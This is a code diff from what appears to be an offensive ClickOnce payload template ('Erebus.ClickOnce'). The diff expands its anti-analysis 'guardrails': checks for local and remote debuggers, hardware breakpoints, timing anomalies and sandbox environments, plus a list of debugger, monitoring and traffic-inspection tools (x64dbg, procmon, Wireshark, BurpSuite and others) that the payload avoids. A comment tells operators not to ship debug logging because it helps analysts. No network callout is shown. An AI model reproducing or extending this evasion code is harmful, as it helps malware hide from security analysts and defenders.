@@ -95,33 +95,55 @@ namespace Erebus.ClickOnce
         public static bool GuardrailsEnabled = {{ GUARDRAILS_ENABLED }};
 
         /// <summary>
-        /// Check if process is being debugged
+        /// Runtime debug logging toggle. When true, DebugLogger.WriteLine
+        /// emits to stdout regardless of build configuration. Never ship
+        /// with this enabled - it gives analysts a clear view of exactly
+        /// which guardrail fired.
+        /// </summary>
+        public static bool DebugLoggingEnabled = {{ DEBUG_LOGGING_ENABLED }};
+
+        /// <summary>
+        /// Check if process is being debugged (native IsDebuggerPresent +
+        /// managed Debugger.IsAttached).
         /// </summary>
         public static bool CheckDebugger = {{ GUARDRAILS_CHECK_DEBUGGER }};
 
         /// <summary>
-        /// Check for debugger processes
+        /// Check for remote debuggers via CheckRemoteDebuggerPresent and
+        /// NtQueryInformationProcess(ProcessDebugPort).
+        /// </summary>
+        public static bool CheckRemoteDebugger = {{ GUARDRAILS_CHECK_REMOTE_DEBUGGER }};
+
+        /// <summary>
+        /// Check for debugger / analysis processes in the BlockedProcesses
+        /// list below.
         /// </summary>
         public static bool CheckDebuggerProcesses = {{ GUARDRAILS_CHECK_DEBUGGER_PROCESSES }};
 
         /// <summary>
-        /// Check for hardware breakpoints
+        /// Check for hardware breakpoints via GetThreadContext against
+        /// Dr0–Dr3 and their corresponding enable bits in Dr7.
         /// </summary>
         public static bool CheckHardwareBreakpoints = {{ GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS }};
 
         /// <summary>
-        /// Check for timing anomalies
+        /// Check for timing anomalies (single-stepping debugger detection).
         /// </summary>
         public static bool CheckTiming = {{ GUARDRAILS_CHECK_TIMING }};
 
         /// <summary>
-        /// List of blocked debugger/analysis processes
+        /// Check for sandbox-indicative environment signals (CPU count,
+        /// RAM, system-drive size, recent-activity folder population).
         /// </summary>
-        public static string[] BlockedProcesses = new string[] { 
-            "x64dbg", "x32dbg", "windbg", "ollydbg", "Debugger",
-            "ProcessEXPLORER", "procmon", "autoruns", "Wireshark",
-            "fiddler", "Charles", "BurpSuite", "ccSvcHst"
-        };
+        public static bool CheckSandboxEnvironment = {{ GUARDRAILS_CHECK_SANDBOX }};
+
+        /// <summary>
+        /// Blocked debugger / analysis process names (case-insensitive).
+        /// Rendered from BuildParameters at build time. Default set covers
+        /// native debuggers, .NET decompilers (dnSpy, dnSpyEx, dotPeek,
+        /// ILSpy, JetBrains), process monitors, and traffic inspectors.
+        /// </summary>
+        public static string[] BlockedProcesses = new string[] { {{ BLOCKED_PROCESSES }} };
 
         /// <summary>
         /// Whitelisted hostnames (empty = allow all)
